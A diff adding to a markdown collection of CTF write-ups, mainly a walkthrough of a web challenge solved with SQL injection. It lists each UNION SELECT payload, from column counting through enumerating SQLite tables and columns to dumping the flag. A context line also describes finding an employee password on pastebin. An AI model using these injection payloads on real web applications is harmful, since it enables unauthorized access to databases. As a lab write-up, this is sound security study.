@@ -5,6 +5,40 @@ title: "Sentinels CTF challenges"
 ## link
 https://sentinelsofvigil.ctfd.io/team
 
+## > Tiers of Naughtiness (Web, 150)
+according to the main page of the challenge, the challenge author tried to make the chal blind sql but failed miserably
+
+upon following the challenge instructions and entering 'playitprobro' into the url parameter, we are given the output
+
+`NAUGHTY: playitprobro is in tier -> 3`
+
+it can be confirmed that this challenge is sqli by entering a single `'` quote in the url parameter, yielding an SQL Error: unrecognized token: "'''"
+
+with sqli, we start by identifying the number of columns that is reflected in output, with the payload `sql ?name=' UNION SELECT NULL--`, which yields another SQL Error: SELECTs to the left and right of UNION do not have the same number of result columns
+
+we systematically increase the number of NULL's in the payload until the app stops throwing errors.
+
+payload | result
+?name=' UNION SELECT NULL, NULL, NULL-- | NAUGHTY: None is in tier -> None
+
+now, we determine which columns are visible in the output with payload `?name=' UNION SELECT 'AAA','BBB','CCC'--+`, producing output
+
+`NAUGHTY: BBB is in tier -> CCC`
+
+i attempt to list the names of tables using the payload `?name=' UNION SELECT NULL,database(),version()--+` but this threw an SQL Error: no such function: database.
+
+i then reattempt using a payload designed for sqlite `?name=' UNION SELECT NULL,name,type FROM sqlite_master WHERE type='table'--+`, which produces output 
+`NAUGHTY: tier_one_secret_123081223_autonau is in tier -> table`
+
+we've found an interesting table. read its columns by: `?name=' UNION SELECT NULL,name,type FROM pragma_table_info('tier_one_secret_123081223_autonau')--+`
+`NAUGHTY: hahah_hi_user is in tier -> TEXT`
+
+now, directly dump the flag: `?name=' UNION SELECT NULL,hahah_hi_user,NULL FROM tier_one_secret_123081223_autonau--+`
+`NAUGHTY: SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( } is in tier -> None`
+
+flag: SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( }
+
+
 ## > Fuzz (Web, 150)
 https://sentinelsofvigil-fuzz.chals.io
 
@@ -99,6 +133,9 @@ this leads to the implication that they used a pastebin web service, such as pas
 searching up the username NOMOREBRAWL on pastebin, we can find the employee's password, 'wasitacaroracatisaw'
 
 flag: SENTI{wasitacaroracatisaw}
+
+## > Vexdru's Wardrobe (OSINT, 200)
+
 
 ## > Vocaloid quiz (OSINT, 1000) -- why???
 YOUNG GIRL A
